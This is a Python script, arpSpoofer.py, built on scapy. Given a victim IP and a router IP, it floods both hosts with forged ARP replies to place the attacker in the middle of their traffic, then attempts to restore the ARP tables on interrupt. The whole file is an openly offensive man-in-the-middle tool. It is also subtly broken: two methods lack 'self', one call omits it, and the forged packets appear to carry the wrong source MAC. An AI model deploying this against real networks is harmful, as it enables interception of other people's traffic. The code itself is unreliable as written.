# arpSpoofer.py
from scapy.all import *
import sys
from termcolor import *


class ArpSpoofer:
    def __init__(self, victim_ip, router_ip):
        self.victim_ip = victim_ip
        self.router_ip = router_ip
        self.victim_mac = getmacbyip(victim_ip)
        self.router_mac = getmacbyip(router_ip)

    def arp_spoof(dest_ip, dest_mac, source_ip):
        packet = ARP(op="is-at", hwsrc=dest_mac, psrc=dest_ip, pdst=source_ip)
        send(packet, verbose=False)

    def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
        packet = ARP(
            op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip
        )
        send(packet, verbose=False)

    def start_spoofing(self):
        print("Sending spoofed ARP packets")
        while True:
            self.arp_spoof(self.victim_ip, self.victim_mac, self.router_ip)
            self.arp_spoof(self.router_ip, self.router_mac, self.victim_ip)

    def stop_spoofing(self):
        print("Restoring ARP Tables")
        arp_restore(self.router_ip, self.router_mac, self.victim_ip, self.victim_mac)
        arp_restore(self.victim_ip, self.victim_mac, self.router_ip, self.router_mac)


def main():
    try:
        spoofer = ArpSpoofer(sys.argv[1], sys.argv[2])
    except IndexError:
        print(
            colored(
                f"This ARP spoofer requires two commandline arguments, the victim IP address and the router IP address.\n",
                "red",
                "on_grey",
                ["bold"],
            )
        )
        return

    try:
        spoofer.start_spoofing()
    except KeyboardInterrupt:
        spoofer.stop_spoofing()
        quit()


if __name__ == "__main__":
    main()
